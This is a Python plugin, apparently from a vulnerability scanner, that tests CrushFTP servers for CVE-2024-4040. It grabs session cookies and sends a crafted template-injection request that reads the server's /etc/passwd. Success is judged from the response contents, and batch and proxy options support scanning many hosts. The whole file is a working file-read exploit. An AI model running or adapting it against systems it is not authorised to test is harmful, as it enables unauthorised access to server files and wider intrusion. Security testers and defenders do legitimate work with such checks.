import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
from urllib.parse import urljoin
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class Cve_2024_4040:
    def check(self,url):
        try:
            auth_response = requests.get(url, headers=self.headers, verify=self.ssl,proxies=self.proxy, allow_redirects=False,timeout=self.timeout)
            current_auth_value = auth_response.cookies.get('currentAuth')
            crush_auth_value = auth_response.cookies.get('CrushAuth')
            target = urljoin(url,
                             '/WebInterface/function/?command=zip&c2f={}&path=%3CINCLUDE%3E/etc/passwd%3C/INCLUDE%3E&names=*'.format(
                                 current_auth_value))
            headers = {
                "User-Agent": self.headers["User-Agent"],
                "Cookie": "currentAuth={};CrushAuth={}".format(current_auth_value, crush_auth_value)
            }
            result_response = requests.get(target, headers=headers, verify=self.ssl,proxies=self.proxy, allow_redirects=False,timeout=self.timeout)
            if result_response.status_code == 200 and 'root' in result_response.text and 'usr' in result_response.text and 'var' in result_response.text:
                OutPrintInfoSuc("CrushFTP", f'存在CrushFTP_CVE-2024-4040_SSTI模版注入漏洞{url}')
                if self.batch:
                    OutPutFile("CrushFTP_2024_4040.txt", f'存在CrushFTP_CVE-2024-4040_SSTI模版注入漏洞{url}')
                else:
                    OutPrintInfo("CrushFTP", f'目标不存在CrushFTP_CVE-2024-4040_SSTI模版注入漏洞')
        except Exception as e:
            if not self.batch:
                OutPrintInfo("CrushFTP", '目标请求出错')
    def main(self,target):
        self.batch = target["batch_work"]
        baseurl = target['url'].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=header,proxy=proxy, bwork=self.batch)

        if not self.batch:
            OutPrintInfo("CrushFTP", '开始执行CrushFTP-CVE-2024-4040-SSTI模版注入检测...')
        self.check(baseurl)
        if not self.batch:
            OutPrintInfo("CrushFTP", 'CrushFTP-CVE-2024-4040-SSTI模版注入检测结束')





